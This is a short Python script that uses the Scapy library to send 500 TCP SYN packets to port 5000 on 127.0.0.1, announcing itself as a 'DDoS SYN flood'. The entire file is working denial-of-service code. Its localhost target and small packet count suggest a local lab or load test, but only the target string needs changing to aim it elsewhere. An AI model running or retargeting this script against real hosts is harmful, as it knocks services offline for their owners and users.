from scapy.all import IP, TCP, send
import time

target = "127.0.0.1"
print("Starting DDoS SYN flood...")
for _ in range(500):
    send(IP(dst=target)/TCP(dport=5000, flags='S'), verbose=0)
    time.sleep(0.005)
print("DDoS finished")